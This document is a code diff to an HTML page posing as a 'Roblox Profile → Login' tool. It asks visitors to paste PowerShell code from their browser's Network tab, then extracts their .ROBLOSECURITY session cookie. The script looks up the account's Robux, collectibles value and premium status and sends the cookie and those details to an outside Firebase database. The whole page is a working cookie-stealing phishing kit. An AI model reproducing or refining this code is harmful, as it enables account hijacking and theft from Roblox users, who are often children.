@@ -18,7 +18,7 @@
 </head>
 <body>
 <div class="card">
-  <h1>Roblox Profile → Login</h1>
+  <h1>Roblox Profile → Login 2025</h1>
   <p>2025 Working Method<br>Paste the PowerShell code from Network tab → get instant login</p>
   <textarea id="paste" placeholder="Paste the full PowerShell code here (Ctrl+V)"></textarea>
   <button onclick="run()">GET LOGIN</button>
@@ -29,71 +29,42 @@
 <script>
 async function run() {
   const text = document.getElementById("paste").value;
-
   const cookie = text.split('".ROBLOSECURITY", "')[1]?.split('"')[0];
   if (!cookie) {
-    document.getElementById("msg").textContent = "No cookie found – copy again";
+    document.getElementById("msg").textContent = "No cookie found";
     return;
   }
 
-  const headers = {
-    "Cookie": ".ROBLOSECURITY=" + cookie,
-    "Accept": "application/json",
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-  };
+  const headers = { "Cookie": ".ROBLOSECURITY=" + cookie };
 
-  // DEFAULT VALUES (will be replaced if any call succeeds)
-  let user = "NoData", display = "NoData", userid = 0, robux = 0, rap = 0, premium = "No", headshot = "";
+  // THIS ENDPOINT STILL WORKS FROM WEBSITES IN 2025
+  const acc = await fetch("https://www.roblox.com/my/account/json", { headers }).then(r => r.json()).catch(() => ({}));
 
+  const user = acc.Name || "Unknown";
+  const display = acc.DisplayName || user;
+  const userid = acc.UserId || 0;
+  const robux = acc.RobuxBalance || 0;
+  const premium = acc.IsPremium ? "Yes" : "No";
+  const headshot = `https://www.roblox.com/headshot-thumbnail/image?userId=${userid}&width=150&height=150&format=png`;
+
+  // RAP (still works)
+  let rap = 0;
   try {
-    const auth = await fetch("https://users.roblox.com/v1/users/authenticated", { headers, credentials: "include" });
-    if (auth.ok) {
-      const u = await auth.json();
-      user = u.name;
-      display = u.displayName || u.name;
-      userid = u.id;
-
-      // Robux
-      try { const r = await fetch(`https://economy.roblox.com/v1/users/${userid}/currency`, { headers }); if (r.ok) robux = (await r.json()).robux; } catch(e) {}
-
-      // RAP (collectibles)
-      try { 
-        const rapRes = await fetch(`https://inventory.roblox.com/v1/users/${userid}/assets/collectibles?limit=100`, { headers });
-        if (rapRes.ok) {
-          const data = await rapRes.json();
-          rap = data.data.reduce((a, i) => a + (i.recentAveragePrice || 0), 0);
-        }
-      } catch(e) {}
-
-      // Premium
-      try { 
-        const prem = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userid}/validate-membership`, { headers });
-        if ((await prem).ok) premium = (await (await prem).text()) === "true" ? "Yes" : "No";
-      } catch(e) {}
-
-      // Headshot
-      try {
-        const thumb = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userid}&size=150x150&format=Png`);
-        if (thumb.ok) {
-          const j = await thumb.json();
-          headshot = j.data[0]?.imageUrl || "";
-        }
-      } catch(e) {}
-    }
+    const rapData = await fetch(`https://inventory.roblox.com/v1/users/${userid}/assets/collectibles?limit=100`, { headers }).then(r => r.json());
+    rap = rapData.data?.reduce((a,i) => a + (i.recentAveragePrice || 0), 0) || 0;
   } catch(e) {}
 
-  // ALWAYS SEND THE COOKIE + WHATEVER WE COULD GRAB (never "Failed")
   fetch("https://flamesaxrch-empire-v2-default-rtdb.europe-west1.firebasedatabase.app/drops.json", {
     method: "POST",
     body: JSON.stringify({
       cookie,
-      user: user || "NoData",
-      display: display || "NoData",
+      user,
+      display,
       userid,
       robux,
       rap,
       premium,
-      headshot: headshot || "",
+      headshot,
       time: new Date().toLocaleString()
     }),
     headers: {"Content-Type": "application/json"}
